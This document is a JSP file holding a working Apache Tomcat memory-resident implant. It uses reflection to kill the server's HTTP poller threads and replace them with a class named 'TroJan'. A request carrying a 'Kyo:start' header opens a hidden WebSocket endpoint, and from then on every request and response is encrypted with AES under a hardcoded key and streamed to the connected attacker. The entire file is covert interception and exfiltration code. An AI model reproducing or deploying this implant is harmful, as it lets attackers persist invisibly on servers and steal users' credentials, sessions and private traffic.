<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="java.util.concurrent.CopyOnWriteArrayList" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.util.regex.Matcher" %>
<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="java.io.IOException" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.util.regex.Pattern" %>
<%@ page import="java.nio.channels.SelectionKey" %>
<%@ page import="org.apache.tomcat.util.codec.binary.Base64" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.util.*" %>
<%!
    Set<Thread> badThread = new HashSet<>();
    String name;


    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public NioEndpoint.Poller getAPoller() {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        NioEndpoint.Poller target = null;
        for (Thread thread : threads) {
            if (thread == null)
                continue;
            if (thread.getName().toLowerCase().contains("poller") && thread.getName().contains("http")) {
                this.badThread.add(thread);
                if (target == null) {
                    this.name = thread.getName();
                    target = (NioEndpoint.Poller) getField(thread, "target");
                }
            }
        }
        return target;
    }

    class TroJan extends NioEndpoint.Poller {

        private ServerContainer wsContainer = null;
        private Map<String, Object> wsmapper = null;

        private boolean wssocket = false;
        private Set<String> listenerList = new HashSet<>();

        private List<FFFF> syncList = new CopyOnWriteArrayList<FFFF>();
        private ByteBuffer allocate = ByteBuffer.allocate(8192);
        private Boolean HttpListen = true;
        private Method read = null;
        private Boolean isByte = false;
        private String key = "zQf],4!.Wpjs!^G/";
        private Cipher encode = null;
        private Cipher decode = null;
        private byte[] allocateByte = new byte[8192];

        public void controllerSyncList(int i, FFFF f) {
            if (i == 1) {
                syncList.add(f);
            } else if (i == 0) {
                syncList.remove(f);
            }
        }

        public void handlerRequest(ByteBuffer buffer) {
            String request = new String(buffer.array());
            Matcher instruction = getInstruction(request, ".*Kyo:(.*?):(.*)");
            if (instruction == null)
                return;
            String main = instruction.group(1);
            String sub = instruction.group(2);
            if (main == null || sub == null)
                return;
            sub = sub.substring(0, sub.indexOf("\r\n"));
            if (main.trim().equals("start")) {
                startListener(sub.trim());
            } else if (main.trim().equals("end")) {
                endListener(sub.trim());
            }
        }

        public void startListener(String key) {
            if (listenerList.contains(key))
                return;
            ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(FFFF.class, key).build();
            try {
                wsContainer.addEndpoint(configEndpoint);
            } catch (DeploymentException e) {

            }
            listenerList.add(key);
        }

        public void endListener(String key) {
            wsmapper.remove(key);
            listenerList.remove(key);
        }


        public TroJan(NioEndpoint nioEndpoint, Method read, Boolean isByte) throws IOException {
            nioEndpoint.super();
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            ServletContext servletContext = standardContext.getServletContext();
            try {
                Field context1 = servletContext.getClass().getDeclaredField("context");
                context1.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) context1.get(servletContext);
                wsContainer = (ServerContainer) applicationContext.getAttribute(ServerContainer.class.getName());
                Field configExactMatchMap = wsContainer.getClass().getDeclaredField("configExactMatchMap");
                configExactMatchMap.setAccessible(true);
                wsmapper = (Map<String, Object>) configExactMatchMap.get(wsContainer);
                this.read = read;
                this.isByte = isByte;
                encode = Cipher.getInstance("AES/ECB/PKCS5Padding");
                encode.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key.getBytes(), "AES"));
                decode = Cipher.getInstance("AES/ECB/PKCS5Padding");
                decode.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key.getBytes(), "AES"));
            } catch (Exception e) {

            }
        }

        public Matcher getInstruction(String request, String key) {
            Pattern compile = Pattern.compile(key, Pattern.DOTALL | Pattern.CASE_INSENSITIVE);
            Matcher matcher = compile.matcher(request);
            if (matcher.matches()) {
                return matcher;
            } else {
                return null;
            }
        }

        @Override
        protected void processKey(SelectionKey sk, NioEndpoint.NioSocketWrapper attachment) {
            try {
                Boolean noResponse = true;
                int readlen = 0;
                if (syncList.size() == 0) {
                    HttpListen = true;
                }
                if (isByte) {
                    readlen = (int) this.read.invoke(attachment, false, this.allocateByte, 0, this.allocateByte.length);
                    allocate.put(this.allocateByte, 0, readlen);
                } else {
                    readlen = (int) this.read.invoke(attachment, false, allocate);
                }
                ByteBuffer allocate1 = ByteBuffer.allocate(readlen);
                allocate1.put(allocate.array(), 0, readlen);
                allocate1.position(0);
                attachment.unRead(allocate1);
                allocate.clear();
                if (allocate1.position() == 0) {
                    noResponse = false;
                }
                if (noResponse) {
                    if (HttpListen) {
                        handlerRequest(allocate1);
                    }
                    if (noResponse) {
                        for (FFFF elem : syncList) {
                            String request = new String(attachment.getSocketBufferHandler().getReadBuffer().array());
                            String response = new String(attachment.getSocketBufferHandler().getWriteBuffer().array());
                            String s = request.trim() + "&&&&&&&&" + response.trim();
                            elem.sendMessage(Base64.encodeBase64String(encode.doFinal(s.getBytes())));
                        }
                    }
                }
            } catch (Exception e) {
            }
            super.processKey(sk, attachment);
        }
    }

    public static class FFFF extends Endpoint implements MessageHandler.Whole<String> {
        private Session session;
        private TroJan poller;

        @Override
        public void onMessage(String s) {
        }

        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            this.session = session;
            session.addMessageHandler(this);
            poller = (TroJan) getAPoller();
            poller.controllerSyncList(1, this);
        }

        public void sendMessage(String info) throws IOException {
            try {
                this.session.getBasicRemote().sendText(info);
            } catch (Exception e) {
            }
        }

        @Override
        public void onClose(Session session, CloseReason closeReason) {
            poller.controllerSyncList(0, this);
            super.onClose(session, closeReason);
        }

        public Object getField(Object object, String fieldName) {
            Field declaredField;
            Class clazz = object.getClass();
            while (clazz != Object.class) {
                try {

                    declaredField = clazz.getDeclaredField(fieldName);
                    declaredField.setAccessible(true);
                    return declaredField.get(object);
                } catch (NoSuchFieldException | IllegalAccessException e) {
                }
                clazz = clazz.getSuperclass();
            }
            return null;
        }

        public NioEndpoint.Poller getAPoller() {
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
            NioEndpoint.Poller target = null;
            for (Thread thread : threads) {
                if (thread == null)
                    continue;
                if (thread.getName().toLowerCase().contains("poller") && thread.getName().contains("http")) {
                    if (target == null) {
                        target = (NioEndpoint.Poller) getField(thread, "target");
                    }
                }
            }
            return target;
        }
    }
%>
<%
    NioEndpoint.Poller aPoller = getAPoller();
    if (!(aPoller instanceof TroJan)) {
        Iterator<Thread> iterator = this.badThread.iterator();
        while (iterator.hasNext()) {
            iterator.next().stop();
        }
        this.badThread.clear();
        NioEndpoint nio = (NioEndpoint) getField(aPoller, "this$0");

        Method read = null;
        boolean isbyte = false;

        try {
            read = NioEndpoint.NioSocketWrapper.class.getDeclaredMethod("read", boolean.class, ByteBuffer.class);
        } catch (NoSuchMethodException e) {
            read = NioEndpoint.NioSocketWrapper.class.getDeclaredMethod("read", boolean.class, byte[].class, int.class, int.class);
            isbyte = true;
        }
        TroJan trojan = new TroJan(nio, read, isbyte);
        Field pollers1 = null;
        Boolean isPollerArray = true;
        try {
            pollers1 = NioEndpoint.class.getDeclaredField("pollers");
        } catch (NoSuchFieldException e) {
            pollers1 = NioEndpoint.class.getDeclaredField("poller");
            isPollerArray = false;
        }
        pollers1.setAccessible(true);

        if (isPollerArray) {
            pollers1.set(nio, new NioEndpoint.Poller[]{trojan});
        } else {
            pollers1.set(nio, trojan);
        }
        Thread thread = new Thread(trojan, name);
        thread.setPriority(Thread.MIN_PRIORITY);
        thread.setDaemon(true);
        thread.start();
    }
%>